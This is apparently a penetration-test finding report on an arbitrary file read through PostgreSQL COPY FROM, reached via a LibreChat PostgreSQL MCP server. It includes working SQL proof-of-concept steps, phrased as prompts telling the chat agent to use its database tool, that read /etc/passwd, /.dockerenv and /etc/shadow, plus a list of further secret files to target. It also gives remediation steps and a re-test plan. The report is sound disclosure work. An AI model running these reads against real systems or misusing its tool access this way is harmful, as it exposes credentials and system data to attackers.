# PostgreSQL Arbitrary File Read via COPY FROM

## Summary
The LibreChat application's PostgreSQL MCP server allows authenticated users to read arbitrary files from the database server's filesystem using the `COPY FROM '/path/to/file'` feature. This enables attackers to access sensitive system files, application configuration, and potentially extract additional credentials or source code.

## Title
PostgreSQL Arbitrary File Read via COPY FROM

## CVSS
CVSS:4.0/AV:N/AC:L/AT:N/PR:L/UI:N/VC:H/VI:N/VA:N/SC:H/SI:N/SA:N
**Score: 8.2 (High)**

## Short Recommendation
Disable PostgreSQL `COPY FROM` file reading capability. Restrict PostgreSQL MCP to SELECT-only queries and implement file access controls at the database level.

## Affected Components
- **Address**: 10.0.1.11 (penny.allports.tours)
- **Port**: 443 (HTTPS)
- **Component**: LibreChat PostgreSQL MCP Server
- **PostgreSQL Feature**: COPY FROM file

## Technical Description
The PostgreSQL MCP server allows users to execute SQL queries including the `COPY FROM 'filename'` command, which reads files from the database server's filesystem. The database server process has read access to various system files, enabling information disclosure.

Successfully exploited to read:
- `/etc/passwd` - System user accounts (10+ users including root, daemon, mail, etc.)
- `/.dockerenv` - Confirmed running in Docker container
- Attempted `/etc/shadow` - Password hashes (likely failed due to permissions)

The `COPY FROM` feature reads the specified file line by line into a PostgreSQL table, which is then queried and returned through the AI chat interface. Unlike `COPY FROM PROGRAM`, this doesn't execute commands but still provides dangerous file system access.

**Attack Pattern:**
```sql
CREATE TEMP TABLE temp_table (content text);
COPY temp_table FROM '/path/to/sensitive/file';
SELECT * FROM temp_table;
```

The database runs as the `postgres` user which typically has read access to:
- Application files (if database is in same container)
- Configuration files
- System files (passwd, hosts, resolv.conf)
- Mounted volumes
- Docker/container metadata

## Evidence

**Successful File Read - /etc/passwd:**
```sql
CREATE TEMP TABLE temp_passwd (content text);
COPY temp_passwd FROM '/etc/passwd';
SELECT * FROM temp_passwd LIMIT 10;
```

**Results:**
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
```

**Container Detection - /.dockerenv:**
```sql
COPY temp_check FROM '/.dockerenv';
```
*Successfully read, confirming Docker container environment*

**Attempted /etc/shadow read:**
```sql
CREATE TEMP TABLE shadow_data (content text);
COPY shadow_data FROM '/etc/shadow';
SELECT * FROM shadow_data;
```
*Likely failed due to permissions, but attempt demonstrates intent*

[Screenshots to be added showing AI conversation with file read operations]

## Proof of Concept Commands

**Access Method:**
1. Navigate to https://penny.allports.tours
2. Authenticate → Create conversation → Select "Agents" → Select Claude model

**PoC Step 1 - Read /etc/passwd:**
```
Use the postgres MCP tool to execute:

DROP TABLE IF EXISTS temp_passwd;
CREATE TEMP TABLE temp_passwd (content text);
COPY temp_passwd FROM '/etc/passwd';
SELECT * FROM temp_passwd LIMIT 10;
```

**Expected Result:** System user accounts displayed

**PoC Step 2 - Detect Container Environment:**
```
Execute via postgres MCP:

CREATE TEMP TABLE check_docker (data text);
COPY check_docker FROM '/.dockerenv';
SELECT 'Running in Docker' as status;
```

**Expected Result:** Confirms Docker environment

**PoC Step 3 - Read System Configuration:**
```
Use postgres MCP:

CREATE TEMP TABLE hosts_file (content text);
COPY hosts_file FROM '/etc/hosts';
SELECT * FROM hosts_file;
```

**Expected Result:** Network configuration disclosed

**Other Potentially Readable Files:**
- `/etc/hostname` - Server hostname
- `/etc/resolv.conf` - DNS configuration
- `/proc/self/environ` - Environment variables (alternative to printenv)
- `/proc/self/cmdline` - Process command line
- `/proc/mounts` - Mounted filesystems
- `/app/.env` (if accessible) - Application secrets
- `/var/log/*` (if accessible) - Log files

## Recommendation

**Immediate (Within 1 Hour):**
- Revoke FILE privilege from PostgreSQL user:
  ```sql
  REVOKE ALL PRIVILEGES ON DATABASE librechat FROM mcp_user;
  GRANT CONNECT ON DATABASE librechat TO mcp_user;
  GRANT SELECT ON specific_tables TO mcp_user;
  ```
- Configure postgresql.conf: Set `allow_file_upload = false`
- Restrict MCP to SELECT queries only via application-layer validation

**Urgent (Within 24 Hours):**
- Implement SQL query allowlisting - block `COPY` commands entirely
- Create new restricted PostgreSQL role with minimal permissions
- Audit what files may have been accessed via log analysis
- Review and restrict filesystem permissions on database server
- Ensure sensitive files are not readable by postgres user

**Short-term (Within 1 Week):**
- Implement comprehensive SQL query validation layer
- Add monitoring/alerting for suspicious SQL patterns
- Run database with minimal filesystem access (read-only where possible)
- Implement SELinux or AppArmor profiles to restrict database file access
- Regular security audits of database permissions
- Add query logging with file access patterns flagged

**Long-term:**
- Remove direct SQL query capability from MCP
- Create safe abstraction layer with predefined queries
- Implement principle of least privilege for database processes
- Regular penetration testing of AI/MCP functionality
- Consider running database in isolated network segment

## References
- CVE-2018-1058: PostgreSQL Privilege Escalation via Search Path
- OWASP Top 10 2021: A01:2021 - Broken Access Control
- CWE-22: Path Traversal
- CWE-73: External Control of File Name or Path
- CWE-200: Exposure of Sensitive Information
- PostgreSQL Documentation: COPY Command Security
- CIS PostgreSQL Benchmark

## Re-test Status
Not yet retested

## Re-test Notes
Retesting should verify:
1. `COPY FROM` file reading fails with permission denied
2. Attempting: `COPY table FROM '/etc/passwd'` returns error
3. PostgreSQL user cannot read sensitive files
4. Query logs show COPY commands are blocked
5. Filesystem permissions restrict database user access

**Test Command:**
```
Use postgres MCP to execute:
CREATE TEMP TABLE test (data text);
COPY test FROM '/etc/passwd';
SELECT * FROM test;
```

**Expected After Fix:** Error message "permission denied" or "COPY FROM file not allowed"

## Impact

**Confidentiality (HIGH):** Sensitive file disclosure enables attackers to:
- **System reconnaissance**: User accounts, system configuration, network topology
- **Container fingerprinting**: Detect Docker environment, identify container structure
- **Configuration access**: If database can read app files, may access .env, config files with additional secrets
- **Source code access**: If application code is readable, identify additional vulnerabilities
- **Log analysis**: Access logs may contain credentials, session tokens, API keys
- **Credential harvesting**: `/etc/shadow` (if accessible), SSH keys, certificate private keys

**Integrity (NONE):** File read operation is read-only, no direct integrity impact.

**Availability (NONE):** Reading files does not impact system availability.

**Information Gathering Value:**
The `/etc/passwd` file provides valuable reconnaissance:
- System architecture understanding
- Service accounts identification
- Potential privilege escalation targets
- Container vs bare metal detection

**Combined with F001 (RCE):**
This file read capability becomes more dangerous when combined with command execution:
1. Read `/etc/passwd` to identify users
2. Read `/proc/self/environ` as alternative to `printenv`
3. Read config files to find additional attack vectors
4. Read application source code to identify vulnerabilities
5. Use RCE to exfiltrate files that can't be read directly

**Attack Scenario:**
1. Attacker authenticates to LibreChat
2. Reads `/etc/passwd` to understand system
3. Confirms Docker environment via `/.dockerenv`
4. Attempts to read `/etc/shadow` for password hashes
5. Reads `/etc/hosts` to map internal network
6. Searches for readable application files (`/app/.env`, `/var/www/config.php`)
7. Uses discovered information to escalate attack
8. Combined with F001 RCE, uses commands to access non-readable files

**Real-World Impact:**
- System configuration disclosed
- Container environment fingerprinted
- Internal network topology revealed
- Foundation for advanced attacks (pivoting, lateral movement)
- When combined with RCE: Complete file system access

**Likelihood:** HIGH - Easy to exploit with basic SQL knowledge. Success rate depends on filesystem permissions but `/etc/passwd` is always readable. Attack takes less than 2 minutes.

While lower severity than F001 (RCE), this vulnerability provides critical reconnaissance information and attack surface mapping for advanced exploitation.
